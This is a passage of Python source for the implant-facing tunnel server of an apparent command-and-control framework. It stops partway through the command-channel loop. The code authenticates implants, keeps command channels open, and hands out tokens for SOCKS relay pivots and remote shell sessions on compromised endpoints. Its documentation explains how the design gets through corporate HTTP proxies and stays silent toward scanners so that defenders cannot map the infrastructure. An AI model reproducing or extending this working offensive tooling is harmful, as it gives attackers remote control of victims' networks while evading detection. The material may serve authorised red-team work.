"""The implant-facing side of the tunnel: one port, three kinds of connection.

Every connection an endpoint makes arrives here, and **which kind it is
comes from inside the encryption.** The responder completes the Noise
handshake, reads the payload that came with message 1, and dispatches on
it: a `HELLO` becomes a command channel this server holds open, and a
`RELAY(token)` or a `SHELL(token)` is matched against the sessions it has
outstanding and spliced to the one whose token it carries -- a token only
claims the kind it was minted for, so a `SHELL` token cannot take a relay
session nor the reverse.

**One port, and that is not an implementation shortcut.** The protocol
this is derived from allocated a fresh high port per pending session and
had the implant dial back to it. The endpoint here usually reaches the
server through a corporate HTTP `CONNECT` proxy, and Squid ships

    acl SSL_ports port 443
    http_access deny CONNECT !SSL_ports

so a second, unpredictable destination port is simply refused and the
tunnel never forms. The 32-byte token in the first authenticated payload
does the job the dial-back port used to do, and does it cryptographically
rather than by arrival order: a party that cannot produce the token the
server issued over the authenticated command channel cannot take the
session, and "whoever connects first" still does not work.

**The failure path writes nothing at all.** An unauthenticated peer cannot
produce a valid Noise message 1, and when one tries, the socket is closed
without a byte going out -- not an error frame, not a reset pattern, not
anything an enumerator could match. The original answered every connection
on its port with the two bytes `00 00`, which is exactly how its
infrastructure was mapped across hosting providers with a single scan. Any
deterministic response reintroduces that, so there is one and only one
thing this server does with garbage: it closes, on a bounded timer.

Three sharp edges in the layers below are handled here rather than there,
because this is the caller those layers defer to:

* **`NoiseSession.decrypt` does not retire the session on an
  authentication failure.** Noise §5.1 says a session must be abandoned
  after a DECRYPT failure; that class leaves the policy to its caller, so
  a `ValueError` out of `decrypt` closes the connection here.
* **`read_frame` cannot tell an orderly teardown from a malformed peer.**
  A clean EOF between frames raises `ValueError` just as a truncated frame
  does, and a stall past the socket timeout raises `socket.timeout`, which
  is an `OSError`. `_waiting_bytes` moves that distinction into the socket
  API: one `MSG_PEEK` before each frame, where `b""` is a FIN with nothing
  behind it and a timeout is an endpoint that went silent. A `ValueError`
  out of `read_frame` afterwards therefore means bytes were in hand and
  were wrong, which is a malformed peer and nothing else.
* **`write_frame`'s single `sendall` does not make concurrent writes
  safe** -- `sendall` loops over partial sends and releases the GIL. Both
  the keep-alive and `OPEN_RELAY` write to a command channel from threads
  other than its reader, so every write goes through that channel's lock,
  and the lock covers the `encrypt` call as well as the bytes: the nonce
  it advances has to be ordered with the frame it belongs to.

**The port table is what makes a SOCKS port stable, not the process.**
`port_range` is not a range of relay ports -- there are none, that is the
whole point above. It is the range from which each endpoint identity is
assigned its own loopback SOCKS port, which a later task binds; this
server records the assignment in `state_path` and reports it. The file is
read at start-up, so a restart hands the same identity the same port.

**The identity is the build's, never the fleet's display name.** The key
of the port table is the identity of the PSK that authenticated the
connection. `HELLO` may also assert one, and if it disagrees with the PSK
the connection is refused: under `NKpsk0` the PSK is the whole credential,
and a build free to claim another build's identity in `HELLO` would be a
SOCKS port pointing at a different network than the operator believes.
`HELLO` also carries the host's `_implant_id` for correlation with a fleet
row, plus hostname and OS for display. An endpoint whose `_implant_id`
matches no known agent is reported **unlinked**, not hidden -- a
systemd-started endpoint with no beacon above it is a supported
deployment.

Keep-alive is `MSG_PING` / `MSG_PONG` on a configurable interval, and not
a zero-valued port, which is the original's published trait.

Stdlib only. This module never sees the beacon's symmetric encryption key:
the tunnel authenticates with its own Noise credentials, and neither its
configuration nor its state has a field that could hold one.
"""

import hmac
import json
import logging
import os
import socket
import threading
import time
from typing import Callable, Dict, List, Optional, Tuple

from .. import beacon
from .protocol import (
    MSG_CLOSE,
    MSG_HELLO,
    MSG_OPEN_RELAY,
    MSG_OPEN_SHELL,
    MSG_PING,
    MSG_PONG,
    MSG_RELAY,
    MSG_SHELL,
    MESSAGE_KIND_NAMES,
    NoiseSession,
    decode_message,
    encode_message,
    SHELL_DEFAULT_COLS,
    SHELL_DEFAULT_ROWS,
    read_frame,
    write_frame,
)
# The argument check the operator-facing SOCKS port already owns. One
# definition rather than a second identical one here: that module is this
# package's home for the checks its two ports and this server share, and
# the import runs the other way round from the one that is forbidden --
# `socks.py` knows nothing about this module, and must not.
from .socks import positive

logger = logging.getLogger("raccoon.tunnel.server")

__all__ = ["RelaySession", "RelayStream", "TunnelServer", "crypto_path"]

# The session token. 32 bytes because it is the only thing standing between
# an authenticated build and somebody else's relay, and because it costs
# nothing: one `os.urandom(32)` per session.
TOKEN_LEN = 32

_STATE_VERSION = 2
_DIR_MODE = 0o700
_FILE_MODE = 0o600

# How long `accept` blocks before the loop looks at the stop flag again.
_ACCEPT_POLL = 0.25

# Bounds on the housekeeping tick, which carries the keep-alive, the
# session expiry and the watchdog on unauthenticated connections. The floor
# keeps a test with a 100 ms interval honest; the ceiling keeps the amount
# any of those three can overrun by to one second, whatever the configured
# intervals are.
_TICK_FLOOR = 0.02
_TICK_CEILING = 1.0

# How long a command channel's read blocks before it looks at the stop flag
# again. Bounded so that `stop` does not wait out an idle timeout, and so
# that the loop does not depend on a closed socket waking a blocked `recv`.
_READ_POLL = 1.0


def crypto_path() -> str:
    """Which AES backend this process has: `openssl` or `pure-python`.

    Read through the module rather than copied at import, so a test that
    forces the slow backend sees it here too. The panel shows this for
    every running tunnel, because a pure-Python tunnel is slow in a way
    that is otherwise diagnosed as a network fault.
    """
    return "pure-python" if beacon._USE_PURE_PYTHON_AES else "openssl"


class RelayStream(object):
    """The decrypted byte stream of one paired relay connection.

    `sendall` and `recv` are deliberately the socket's own names: what is
    above this is a SOCKS exchange that wants a stream, and what is below
    is one Noise message per frame. `recv_message` is the frame-shaped
    primitive underneath, for a caller that wants message boundaries; mix
    the two and `recv_message` will miss whatever `recv` is still holding,
    so pick one per stream.

    Writes take a lock. One `sendall` does not serialise two threads, and
    `encrypt` advances a nonce that has to be ordered with the frame it
    produced, so the lock covers both.
    """

    def __init__(self, sock: socket.socket, noise: NoiseSession,
                 peer: str = "", on_close: Optional[Callable[[], None]] = None):
        self._sock = sock
        self._noise = noise
        self.peer = peer
        self._on_close = on_close
        self._buffer = b""
        self._eof = False
        self._closed = False
        self._write_lock = threading.Lock()
        # A lock of its own for the closed flag, held across nothing. The
        # write lock cannot serve: `sendall` holds that one across a
        # blocking send, and `close` has to be able to run then.
        self._state_lock = threading.Lock()
        self._counter_lock = threading.Lock()
        self.bytes_in = 0
        self.bytes_out = 0

    def settimeout(self, timeout: Optional[float]) -> None:
        """Set the socket's timeout: the consumer's policy, not ours."""
        self._sock.settimeout(timeout)

    def sendall(self, data: bytes) -> None:
        """One frame carrying `data`. An empty `data` sends nothing."""
        if not data:
            return
        with self._write_lock:
            if self._closed:
                raise OSError("this relay stream is closed")
            write_frame(self._sock, self._noise.encrypt(data))
        with self._counter_lock:
            self.bytes_out += len(data)

    def recv(self, size: int) -> bytes:
        """Up to `size` bytes. `b""` means the far end is finished."""
        if size <= 0:
            return b""
        while not self._buffer:
            chunk = self.recv_message()
            if not chunk:
                return b""
            self._buffer = chunk
        data, self._buffer = self._buffer[:size], self._buffer[size:]
        return data

    def recv_message(self) -> bytes:
        """One whole message's plaintext. `b""` means the far end is finished.

        A frame that does not decrypt raises `ValueError` and closes the
        stream, which is Noise §5.1's rule applied where this module is
        the caller it was deferred to.
        """
        if self._eof or self._closed:
            return b""
        try:
            if not _waiting_bytes(self._sock):
                # A FIN with nothing behind it: the far end is done.
                self._eof = True
                self.close()
                return b""
            frame = read_frame(self._sock)
        except socket.timeout:
            # Only reachable if the consumer asked for a timeout, so the
            # stall is its business to interpret and not ours to hide
            # behind an end-of-stream.
            raise
        except (OSError, ValueError):
            # With bytes in hand this is a malformed or truncated frame,
            # and without them it is a dead socket. Either way the stream
            # is finished; the consumer is pumping bytes and has nothing
            # to do with the difference.
            self._eof = True
            self.close()
            return b""
        try:
            plaintext = self._noise.decrypt(frame)
        except ValueError:
            self.close()
            raise
        with self._counter_lock:
            self.bytes_in += len(plaintext)
        return plaintext

    def close(self) -> None:
        """Shut the stream down. Never waits on a write in flight.

        `sendall` can be parked inside `write_frame` for as long as the far
        end declines to read -- the consumer owns the socket timeout and
        the default is none, so TCP backpressure alone parks it -- and it
        holds the write lock the whole time. Waiting for that lock here
        would hang `TunnelServer.stop`, whose whole promise is to be
        immediate, on an operator thread. So the flag has a small lock of
        its own and the socket is shut down from outside the write lock
        rather than inside it.

        That is safe in both directions. `shutdown` is what unparks a
        blocked `sendall`: measured, it returns `BrokenPipeError` at once.
        And CPython re-checks the descriptor on each iteration of its send
        loop, so a parked writer cannot write into a descriptor that was
        closed and recycled under it -- it raises instead.
        """
        with self._state_lock:
            if self._closed:
                return
            self._closed = True
        _shut(self._sock)
        if self._on_close is not None:
            self._on_close()

    @property
    def closed(self) -> bool:
        return self._closed


class RelaySession(object):
    """One session the operator has asked for, before and after it is paired.

    `token` is what the endpoint has to present on its second connection.
    `kind` is `"relay"` or `"shell"`, and the token only claims the kind it
    was minted for. `sock` is the paired, decrypted stream, and it is `None`
    until `wait_paired` returns True.
    """

    def __init__(self, number: int, identity: str, token: bytes,
                 kind: str = "relay"):
        self.number = number
        self.identity = identity
        self.token = token
        self.kind = kind
        self.sock = None            # type: Optional[RelayStream]
        self.created = time.time()
        self.paired_at = None       # type: Optional[float]
        self.state = "pending"
        # Set when the session stops being pending for any reason, so a
        # waiter is released by an expiry as promptly as by a pairing
        # instead of sitting out its whole timeout.
        self._settled = threading.Event()

    def wait_paired(self, timeout: Optional[float] = None) -> bool:
        """True once the endpoint has presented this session's token."""
        self._settled.wait(timeout)
        return self.state == "paired"

    def close(self) -> None:
        """Finish with this session and drop its connection."""
        stream = self.sock
        self.state = "closed"
        self._settled.set()
        if stream is not None:
            stream.close()

    def _claim(self) -> None:
        self.state = "claimed"

    def _pair(self, stream: RelayStream) -> None:
        self.sock = stream
        self.paired_at = time.time()
        self.state = "paired"
        self._settled.set()

    def _expire(self, why: str) -> None:
        self.state = why
        self._settled.set()

    def _stream_closed(self) -> None:
        self.state = "closed"
        self._settled.set()


class _CommandChannel(object):
    """One endpoint's command channel: its socket, Noise session and lock."""

    def __init__(self, identity: str, sock: socket.socket,
                 noise: NoiseSession, peer: str):
        self.identity = identity
        self.sock = sock
        self.noise = noise
        self.peer = peer
        self.port = None            # type: Optional[int]
        self.implant_id = None      # type: Optional[str]
        self.hostname = None        # type: Optional[str]
        self.os_name = None         # type: Optional[str]
        # Which AES backend the *endpoint* has, as its HELLO reported it.
        # Not this process's: `crypto_path()` answers for the server, and
        # the two halves are different hosts with different libcrypto.
        self.crypto = None          # type: Optional[str]
        # What the endpoint said it can do beyond the relay. Empty for a
        # build that sends no `features`, which is also what makes that
        # build safe: a kind it does not know ends its control loop.
        self.features = ()          # type: Tuple[str, ...]
        self.connected_at = time.time()
        self.last_seen = self.connected_at
        self.last_ping = self.connected_at
        # False until the handshake is finished, so the keep-alive cannot
        # write into a connection that is still mid-handshake. The channel
        # is in the table before then, because the duplicate-identity check
        # and the insertion have to be one atomic step.
        self.ready = False
        self._write_lock = threading.Lock()
        # As on `RelayStream`, and for the same reason: `close` must not
        # queue behind a send that is parked on a full buffer. The command
        # channel escapes that today only because `_command_loop` leaves a
        # one-second timeout on the descriptor, which is an accident of
        # the read path and not a property of this one.
        self._state_lock = threading.Lock()
        self._closed = False

    def send(self, kind: int, body: dict) -> None:
        """One command message, under the lock that orders the nonce too."""
        with self._write_lock:
            if self._closed:
                raise OSError("this command channel is closed")
            write_frame(self.sock, self.noise.encrypt(encode_message(kind, body)))

    def send_handshake(self, message: bytes) -> None:
        with self._write_lock:
            write_frame(self.sock, message)

    def touch(self) -> None:
        self.last_seen = time.time()

    def close(self) -> None:
        with self._state_lock:
            if self._closed:
                return
            self._closed = True
        _shut(self.sock)


class TunnelServer(object):
    """The implant-facing listener, its endpoint table and its port table.

    `port_range` is `(first, last)` inclusive, and it is the range of
    **loopback SOCKS ports** assigned one per endpoint identity. Nothing
    here binds one: this server records the assignment in `state_path` and
    reports it, and a later task opens the port.

    `shell_port_range` is the same shape for a second, optional table of
    loopback ports, one per identity, for a shell a later task opens. Absent
    means no shell ports are assigned, and that costs nothing else.

    `agent_lookup` is an optional callable taking an `_implant_id` and
    returning the fleet's display name for that host, or `None`. It is
    optional because an endpoint started from systemd has no fleet row
    above it at all, which is a supported deployment and not an error.
    """

    def __init__(self, keystore, bind_host: str, bind_port: int,
                 port_range: Tuple[int, int], state_path,
                 agent_lookup: Optional[Callable[[str], Optional[str]]] = None,
                 shell_port_range: Optional[Tuple[int, int]] = None,
                 keepalive_interval: float = 30.0,
                 idle_timeout: Optional[float] = None,
                 handshake_timeout: float = 10.0,
                 session_timeout: float = 60.0,
                 backlog: int = 64):
        self._keystore = keystore
        self.bind_host = bind_host
        self.bind_port = int(bind_port)
        self.first_port, self.last_port = _port_range(port_range)
        if shell_port_range is None:
            self.shell_first_port = self.shell_last_port = None
        else:
            self.shell_first_port, self.shell_last_port = _port_range(
                shell_port_range)
            # Refused rather than narrowed: a shell port taken from the
            # SOCKS pool would eventually leave a new build with no SOCKS
            # port and so no registration, which is the one cost a shell
            # port must never impose. The assigners still treat each
            # other's ports as taken, for a hand-edited state file.
            if (self.shell_first_port <= self.last_port
                    and self.first_port <= self.shell_last_port):
                raise ValueError(
                    "shell_port_range %d-%d overlaps port_range %d-%d; the "
                    "two ranges must be disjoint"
                    % (self.shell_first_port, self.shell_last_port,
                       self.first_port, self.last_port))
        self.state_path = os.path.abspath(os.fspath(state_path))
        self._agent_lookup = agent_lookup
        self.keepalive_interval = positive(keepalive_interval,
                                           "keepalive_interval")
        # Three keep-alives missed before an endpoint is declared gone: one
        # lost PING on a bad link should not cost a tunnel.
        self.idle_timeout = (positive(idle_timeout, "idle_timeout")
                             if idle_timeout is not None
                             else 3 * self.keepalive_interval)
        self.handshake_timeout = positive(handshake_timeout,
                                          "handshake_timeout")
        self.session_timeout = positive(session_timeout, "session_timeout")
        self.backlog = int(backlog)

        self.port = None            # type: Optional[int]
        self._lock = threading.RLock()
        self._ports = {}            # type: Dict[str, int]
        # The second table: identity -> loopback port for a later task's
        # shell. Failing to fill it never costs an endpoint anything; see
        # `_assign_shell_port`. `_shell_why` is the reason an identity has
        # no entry, per server run, for the panel's `shell_detail`.
        self._shell_ports = {}      # type: Dict[str, int]
        self._shell_why = {}        # type: Dict[str, str]
        self._channels = {}         # type: Dict[str, _CommandChannel]
        self._sessions = []         # type: List[RelaySession]
        self._session_count = 0
        # Bytes each way per identity, carried over from sessions that have
        # finished. The panel's row is per endpoint, and a counter that
        # dropped back to zero when a relay closed would tell the operator
        # nothing moved through an endpoint that had just carried a scan.
        # Per server run, not persisted: `state_path` exists to keep a
        # SOCKS port stable, and turning it into a traffic log would mean
        # writing it on every session teardown and showing numbers from a
        # previous engagement.
        self._traffic = {}          # type: Dict[str, List[int]]
        self._workers = []          # type: List[threading.Thread]
        # Every socket accepted but not yet authenticated, against the time
        # it arrived, so `stop` can drop a peer sitting halfway through a
        # handshake and the watchdog below can bound one that dribbles.
        self._live = {}             # type: Dict[socket.socket, float]
        self._listener = None       # type: Optional[socket.socket]
        self._accept_thread = None  # type: Optional[threading.Thread]
        self._housekeeper = None    # type: Optional[threading.Thread]
        self._stopping = threading.Event()
        self._stopping.set()
        self._load_state()

    # ── lifecycle ──

    def start(self) -> None:
        """Bind, listen, and start the accept loop. Sets `port`."""
        if self._listener is not None:
            raise RuntimeError("this tunnel server is already serving")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.bind_host, self.bind_port))
            sock.listen(self.backlog)
        except OSError:
            sock.close()
            raise
        # A poll rather than a blocking accept, so `stop` does not depend
        # on the platform's behaviour when a listening socket is closed
        # out from under a thread sitting in accept.
        sock.settimeout(_ACCEPT_POLL)
        self._listener = sock
        self.port = sock.getsockname()[1]
        self._stopping.clear()
        self._accept_thread = threading.Thread(
            target=self._accept_loop, name="tunnel-accept", daemon=True)
        self._housekeeper = threading.Thread(
            target=self._housekeeping_loop, name="tunnel-keepalive",
            daemon=True)
        self._accept_thread.start()
        self._housekeeper.start()
        logger.info("tunnel: listening on %s:%d, SOCKS ports %d-%d",
                    self.bind_host, self.port, self.first_port, self.last_port)

    def stop(self) -> None:
        """Stop serving and drop every endpoint.

        Safe before `start`, and safe twice.
        """
        self._stopping.set()
        listener, self._listener = self._listener, None
        if listener is not None:
            listener.close()
        for thread in (self._accept_thread, self._housekeeper):
            if thread is not None:
                thread.join(timeout=3.0)
        self._accept_thread = self._housekeeper = None
        with self._lock:
            channels = list(self._channels.values())
            sessions = list(self._sessions)
            workers = list(self._workers)
            live = list(self._live)
            self._channels.clear()
            self._sessions = []
            self._workers = []
            self._live = {}
        for session in sessions:
            session.close()
        for channel in channels:
            channel.close()
        for conn in live:
            _shut(conn)
        with self._lock:
            # After the closes, so a row read after `stop` still reports
            # everything those sessions carried.
            self._retire(sessions)
        for worker in workers:
            worker.join(timeout=3.0)

    def is_serving(self) -> bool:
        return self._listener is not None

    # ── what the panel reads ──

    def endpoints(self) -> List[dict]:
        """One row per identity in the port table, connected or not.

        A disconnected identity keeps its row because it keeps its port:
        the panel never re-points a port at another identity, and hiding
        the row would make an endpoint that aged out look like one that
        was never issued a port.

        `bytes_in` and `bytes_out` are everything that has crossed this
        endpoint since the server started: the sessions open now plus the
        totals carried over from the ones that have closed. They do not
        survive a restart -- see `_traffic`.
        """
        now = time.time()
        with self._lock:
            ports = dict(self._ports)
            shell_ports = dict(self._shell_ports)
            shell_details = {identity: self._shell_detail(identity)
                             for identity in ports
                             if identity not in shell_ports}
            channels = {identity: channel
                        for identity, channel in self._channels.items()
                        if channel.ready}
            paired = [session for session in self._sessions
                      if session.state == "paired"]
            # Every session still in the table, whatever its state, so a
            # closed-but-not-yet-pruned one keeps counting until the prune
            # folds it into `_traffic`. Summing only the paired ones would
            # leave a tick-wide window in which the row reads zero again,
            # which is the lie this total exists to stop telling.
            live = list(self._sessions)
            carried = {identity: list(total)
                       for identity, total in self._traffic.items()}
        rows = []
        for identity in sorted(ports):
            channel = channels.get(identity)
            mine = [session for session in paired
                    if session.identity == identity]
            counted = [session for session in live
                       if session.identity == identity and session.sock]
            before = carried.get(identity, [0, 0])
            implant_id = channel.implant_id if channel is not None else None
            agent = self._agent_for(implant_id)
            rows.append({
                "identity": identity,
                "port": ports[identity],
                "shell_port": shell_ports.get(identity),
                "shell_detail": shell_details.get(identity, ""),
                "state": "connected" if channel is not None else "disconnected",
                "implant_id": implant_id,
                "agent": agent,
                "linked": agent is not None,
                "hostname": channel.hostname if channel is not None else None,
                "os": channel.os_name if channel is not None else None,
                "peer": channel.peer if channel is not None else None,
                "sessions": len(mine),
                "bytes_in": before[0] + sum(s.sock.bytes_in for s in counted),
                "bytes_out": before[1] + sum(s.sock.bytes_out for s in counted),
                "last_seen_age": (now - channel.last_seen
                                  if channel is not None else None),
                "connected_for": (now - channel.connected_at
                                  if channel is not None else None),
                # Two halves, two answers, and both matter to throughput:
                # this process encrypts every relayed byte as well, so a
                # fast endpoint behind a pure-Python server is just as
                # slow. `endpoint_crypto` comes from the HELLO and is
                # None for a disconnected row, because nothing on this
                # side can know it.
                "server_crypto": crypto_path(),
                "endpoint_crypto": (channel.crypto
                                    if channel is not None else None),
                "features": (list(channel.features)
                             if channel is not None else []),
            })
        return rows

    def status(self) -> List[dict]:
        """One row per relay session the server is holding.

        The token is deliberately absent: this is what an operator panel
        lists, and a listing that returns the credential is how a secret
        ends up in a screenshot. `session` is a per-server counter, which
        is enough to correlate a row with a log line.
        """
        now = time.time()
        with self._lock:
            sessions = list(self._sessions)
        return [{
            "session": session.number,
            "identity": session.identity,
            "kind": session.kind,
            "state": session.state,
            "age": now - session.created,
            "bytes_in": session.sock.bytes_in if session.sock else 0,
            "bytes_out": session.sock.bytes_out if session.sock else 0,
        } for session in sessions]

    # ── what the operator's SOCKS port calls ──

    def open_session(self, identity: str) -> RelaySession:
        """Ask `identity` to open a relay, and return the session to wait on.

        The token goes down the command channel inside `OPEN_RELAY`, which
        is already authenticated and confidential, so it is never on the
        wire in clear. The port in that message is this server's own
        listening port, and it is **advisory**: the endpoint dials the
        port it was configured with, because that is the one it can
        reach. Behind a redirector or any port translation the two
        differ, and a server that expected its own number to be dialled
        would fail every relay while its command channels stayed up. The
        field is kept because a difference between the two is worth
        seeing in a log on either side.
        """
        with self._lock:
            channel = self._channels.get(identity)
            if channel is None or not channel.ready:
                raise ValueError(
                    "no endpoint is connected for identity %r" % identity)
            self._session_count += 1
            session = RelaySession(self._session_count, identity,
                                   os.urandom(TOKEN_LEN))
            self._sessions.append(session)
        try:
            channel.send(MSG_OPEN_RELAY, {"port": self.port,
                                          "token": session.token.hex()})
        except (OSError, ValueError) as exc:
            session._expire("closed")
            with self._lock:
                if session in self._sessions:
                    self._sessions.remove(session)
            raise ValueError("could not ask %r to open a relay: %s"
                             % (identity, exc))
        logger.info("tunnel: asked %r for relay session %d",
                    identity, session.number)
        return session

    def open_shell_session(self, identity: str,
                           cols: int = SHELL_DEFAULT_COLS,
                           rows: int = SHELL_DEFAULT_ROWS) -> RelaySession:
        """Ask `identity` for a terminal, and return the session to wait on.

        Same shape as `open_session`, with one check it does not need: the
        endpoint must have advertised `shell` in its `HELLO`, and that is
        decided **before** a token is minted or a frame is written. An
        endpoint built before the shell meets kind 7 in the last branch of
        its control loop, which logs and returns -- the command channel
        drops, and `_forget` closes every session that rode on it, live
        SOCKS pivots included. A refusal here therefore has to cost the
        channel nothing, which means sending nothing.

        That one refusal carries `shell_unsupported = True` on the
        `ValueError` it raises, so a caller can tell it from the others
        without reading the text: an endpoint that cannot do this is a
        build to replace, and one that is not connected is a build to wait
        for.
        """
        with self._lock:
            channel = self._channels.get(identity)
            if channel is None or not channel.ready:
                raise ValueError(
                    "no endpoint is connected for identity %r" % identity)
            if "shell" not in channel.features:
                # The reason is carried as an attribute as well as in the
                # text, because the operator-facing front has to tell this
                # refusal from "no endpoint is connected" -- one says
                # replace the build, the other says wait for it to call
                # home -- and both are a `ValueError`. An attribute rather
                # than an exception class of its own: `ShellFront` holds
                # this server as a duck-typed collaborator ("anything with
                # `open_shell_session`"), and importing a symbol from here
                # into it would end that, for its test stubs too.
                refusal = ValueError(
                    "the endpoint for identity %r did not advertise the "
                    "'shell' feature (it advertised %s); it predates shell "
                    "sessions and would drop its command channel on the "
                    "request, so none was sent"
                    % (identity, list(channel.features) or "none"))
                refusal.shell_unsupported = True
                raise refusal
            self._session_count += 1
            session = RelaySession(self._session_count, identity,
                                   os.urandom(TOKEN_LEN), kind="shell")
            self._sessions.append(session)
        try:
            channel.send(MSG_OPEN_SHELL, {"port": self.port,
                                          "token": session.token.hex(),
                                          "cols": cols, "rows": rows})
        except (OSError, ValueError) as exc:
            session._expire("closed")
            with self._lock:
                if session in self._sessions:
                    self._sessions.remove(session)
            raise ValueError("could not ask %r to open a shell: %s"
                             % (identity, exc))
        logger.info("tunnel: asked %r for shell session %d",
                    identity, session.number)
        return session

    # ── the accept loop ──

    def _accept_loop(self) -> None:
        while not self._stopping.is_set():
            listener = self._listener
            if listener is None:
                return
            try:
                conn, address = listener.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if self._stopping.is_set():
                    return
                logger.debug("tunnel: accept failed: %s", exc)
                # A failing accept in a tight loop would spin a core; a
                # listener that is genuinely gone is caught by the flag
                # above on the next pass.
                time.sleep(0.05)
                continue
            except Exception:
                # The accept loop is the one thread that must not die: an
                # endpoint that cannot reconnect is the whole tunnel gone.
                # Backed off like the `OSError` arm above it, and for the
                # same reason: a fault that persists would otherwise spin
                # a core here, where there is no `accept` blocking to
                # pace the loop.
                logger.exception("tunnel: unexpected error in the accept loop")
                time.sleep(0.05)
                continue
            peer = "%s:%d" % address[:2]
            worker = threading.Thread(target=self._serve, args=(conn, peer),
                                      name="tunnel-conn", daemon=True)
            with self._lock:
                self._workers = [t for t in self._workers if t.is_alive()]
                self._workers.append(worker)
                self._live[conn] = time.time()
            worker.start()

    def _serve(self, conn: socket.socket, peer: str) -> None:
        """One connection, from the handshake to whatever it turns out to be."""
        handed_off = False
        try:
            handed_off = self._dispatch(conn, peer)
        except (ValueError, OSError) as exc:
            # Everything an unauthenticated or malformed peer can cause
            # arrives here, and the answer is the same for all of it:
            # nothing on the wire, a debug line, and a closed socket. A
            # `KeyStore` that has started failing closed -- a deleted or
            # damaged file -- also lands here, and costs this one
            # connection rather than the accept loop.
            logger.debug("tunnel: dropped %s: %s", peer, exc)
        except Exception:
            logger.exception("tunnel: unexpected error serving %s", peer)
        finally:
            with self._lock:
                self._live.pop(conn, None)
            if not handed_off:
                _shut(conn)

    def _authenticated(self, conn: socket.socket) -> None:
        """Take `conn` off the unauthenticated watchdog list.

        Called the moment a connection has a build behind it. The watchdog
        bounds the time an *unauthenticated* peer may hold a thread, and a
        command channel is supposed to be held open for days.
        """
        with self._lock:
            self._live.pop(conn, None)

    def _dispatch(self, conn: socket.socket, peer: str) -> bool:
        """Authenticate, then act on the first payload.

        True if `conn` was handed on to a session and must not be closed.
        """
        conn.settimeout(self.handshake_timeout)
        # Read before building the responder, so a connection that never
        # sends anything costs no key-store read at all.
        message = read_frame(conn)
        noise = NoiseSession.responder(self._keystore.static_private(),
                                       self._keystore.psks)
        payload = noise.respond(message)
        kind, body = decode_message(payload)
        identity = self._keystore.identity_for(noise.psk)
        if identity is None:
            # Unreachable: `respond` only returns under a PSK the lookup
            # offered. Checked anyway, because "cannot happen" plus a
            # missing check is how an unidentified peer gets a port.
            raise ValueError("authenticated under a PSK no build owns")
        if kind == MSG_HELLO:
            self._serve_command(conn, peer, noise, identity, body)
            return False
        if kind == MSG_RELAY:
            return self._serve_relay(conn, peer, noise, identity, body)
        if kind == MSG_SHELL:
            return self._serve_shell(conn, peer, noise, identity, body)
        logger.debug("tunnel: %s opened with %s, which is not HELLO, RELAY "
                     "or SHELL", peer, MESSAGE_KIND_NAMES.get(kind, kind))
        return False

    # ── the command channel ──

    def _serve_command(self, conn: socket.socket, peer: str,
                       noise: NoiseSession, identity: str, body: dict) -> None:
        self._authenticated(conn)
        claimed = body.get("identity")
        if claimed is not None and claimed != identity:
            logger.warning(
                "tunnel: %s authenticated as build %r but its HELLO claimed "
                "%r; refused", peer, identity, claimed)
            return
        channel = _CommandChannel(identity, conn, noise, peer)
        channel.hostname = _text(body.get("hostname"))
        channel.os_name = _text(body.get("os"))
        channel.implant_id = _text(body.get("implant_id"))
        channel.crypto = _text(body.get("crypto"))
        channel.features = _features(body.get("features"))

        with self._lock:
            present = self._channels.get(identity)
            if present is not None:
                logger.warning(
                    "tunnel: %s claimed identity %r, which %s already holds; "
                    "refused", peer, identity, present.peer)
                return
            try:
                channel.port = self._assign_port(identity)
            except ValueError as exc:
                logger.warning("tunnel: refused %s as %r: %s",
                               peer, identity, exc)
                return
            # After, and outside the refusal above: whatever happens to the
            # shell port, this endpoint is already registered.
            self._assign_shell_port(identity)
            # In the table before the handshake finishes, so that the
            # duplicate check above and this insertion are one atomic step;
            # `ready` keeps the keep-alive off it until it can be written to.
            self._channels[identity] = channel

        try:
            channel.send_handshake(noise.reply())
        except (OSError, ValueError):
            self._forget(channel)
            raise
        with self._lock:
            channel.ready = True
            channel.touch()
        logger.info("tunnel: %s registered as %r, SOCKS port %d, crypto %s "
                    "here and %s there", peer, identity, channel.port,
                    crypto_path(), channel.crypto or "unreported")
        try:
            self._command_loop(channel)
        finally:
            self._forget(channel)

    def _command_loop(self, channel: _CommandChannel) -> None:
        """Read and answer command messages until the channel ends."""
        conn = channel.sock
        # The socket timeout is a poll, not the idle timeout itself, and the
        # idle deadline is measured against `last_seen` below. Two reasons:
        # `stop` must be able to drop an endpoint without waiting out an
        # idle timeout, and closing a socket does not reliably wake another
        # thread blocked in `recv` on every platform -- so this loop comes
        # back to look at the stop flag on its own instead of relying on it.
        poll = min(self.idle_timeout, _READ_POLL)
        conn.settimeout(poll)
        while not self._stopping.is_set():
            try:
                waiting = _waiting_bytes(conn)
            except socket.timeout:
                if time.time() - channel.last_seen < self.idle_timeout:
                    continue
                # Not an error and not a malformed peer: nothing arrived
                # for a whole idle timeout, so the endpoint is gone.
                logger.info("tunnel: %r went silent for %.1fs; dropping it",
                            channel.identity, self.idle_timeout)
                return
            except OSError as exc:
                logger.debug("tunnel: %r: %s", channel.identity, exc)
                return
            if not waiting:
                # A FIN between frames: an orderly teardown, and the only
                # way to tell it from a truncated frame, which `read_frame`
                # reports with the same exception type.
                logger.debug("tunnel: %r closed its command channel",
                             channel.identity)
                return
            try:
                frame = read_frame(conn)
            except socket.timeout:
                # Bytes arrived and then stopped mid-frame. Bounded by the
                # poll above, and dropped rather than waited on.
                logger.debug("tunnel: %r stalled mid-frame",
                             channel.identity)
                return
            except OSError as exc:
                logger.debug("tunnel: %r: %s", channel.identity, exc)
                return
            except ValueError as exc:
                # Reached only with bytes in hand, so this is a frame that
                # was wrong rather than a peer that left.
                logger.debug("tunnel: malformed frame from %r: %s",
                             channel.identity, exc)
                return
            try:
                payload = channel.noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1: abandon the session after a decrypt failure.
                # `NoiseSession` leaves that policy to its caller, which is
                # here, so the connection goes.
                logger.warning("tunnel: %r sent a frame that did not "
                               "authenticate (%s); dropping the channel",
                               channel.identity, exc)
                return
            try:
                kind, body = decode_message(payload)
            except ValueError as exc:
                logger.debug("tunnel: undecodable message from %r: %s",
                             channel.identity, exc)
                return
            channel.touch()
            if kind == MSG_PING:
                try:
                    channel.send(MSG_PONG, {})
                except (OSError, ValueError) as exc:
                    logger.debug("tunnel: could not answer %r: %s",
                                 channel.identity, exc)
                    return
            elif kind == MSG_PONG:
                continue
            elif kind == MSG_CLOSE:
